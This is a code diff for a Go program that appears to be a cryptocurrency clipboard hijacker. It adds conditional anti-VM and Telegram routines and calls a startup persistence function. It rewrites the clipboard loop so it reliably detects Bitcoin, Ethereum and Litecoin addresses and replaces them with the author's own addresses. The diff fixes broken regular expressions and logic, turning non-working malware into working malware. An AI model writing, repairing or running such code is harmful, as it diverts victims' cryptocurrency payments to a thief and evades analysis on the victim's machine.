@@ -7,11 +7,12 @@ import (
 	"path/filepath"
 	"regexp"
 
-	"github.com/d-tsuji/clipboard"
+	"github.com/atotto/clipboard"
+
 	"golang.org/x/sys/windows/registry"
 )
 
-// placeholders for now (except for chat id, bot token and crypto addresses those work)
+// fixed config
 const (
 	avm      = true
 	tg       = true
@@ -23,50 +24,44 @@ const (
 )
 
 func main() {
+	if avm == true {
+		antivm()
+	}
 
-	antivm()
-	telegram()
+	if tg == true {
+		telegram()
+	}
 	startup()
 	clip()
 
 }
 
 func clip() {
-
-	getclipboard, err := clipboard.Get()
-	if err != nil {
-		panic(err)
-	}
-
-	ltcregexp := regexp.MustCompile("/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/")
-	ltcfmt := ltcregexp.String()
-	ethregexp := regexp.MustCompile("/(\b0x[a-f0-9]{40}\b)/g")
-	btcregexp := regexp.MustCompile("/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/")
-	btcb32regexp := regexp.MustCompile("/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/")
-	btcb32 := btcb32regexp.String()
-	ethfmt := ethregexp.String()
-	btcfmt := btcregexp.String()
+	ltcregexp := regexp.MustCompile(`^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$`)
+	ethregexp := regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)
+	btcregexp := regexp.MustCompile(`^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$`)
+	btcb32regexp := regexp.MustCompile(`^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$`)
 
 	for {
-		if getclipboard == btcb32 {
-			fmt.Printf("BTC DETECTED")
-			clipboard.Set(BTC)
+
+		getclipboard, err := clipboard.ReadAll()
+		if err != nil {
+			fmt.Print("clipboard error")
 		}
-		if getclipboard == ethfmt {
-			fmt.Printf("ETH DETECTED")
-			clipboard.Set(ETH)
+
+		if btcb32regexp.MatchString(getclipboard) || btcregexp.MatchString(getclipboard) {
+			fmt.Println("BTC DETECTED")
+			clipboard.WriteAll(BTC)
+		} else if ethregexp.MatchString(getclipboard) {
+			fmt.Println("ETH DETECTED")
+			clipboard.WriteAll(ETH)
+		} else if ltcregexp.MatchString(getclipboard) {
+			fmt.Println("LTC DETECTED")
+			clipboard.WriteAll(LTC)
 		}
-		if getclipboard == btcfmt {
-			fmt.Printf("BTC DETECTED")
-			clipboard.Set(BTC)
-		}
-		if getclipboard == ltcfmt {
-			fmt.Printf("LTC DETECTED")
-			clipboard.Set(LTC)
-		}
+
 	}
 }
-
 func startup() {
 
 	exepath, err := filepath.Abs(os.Args[0])
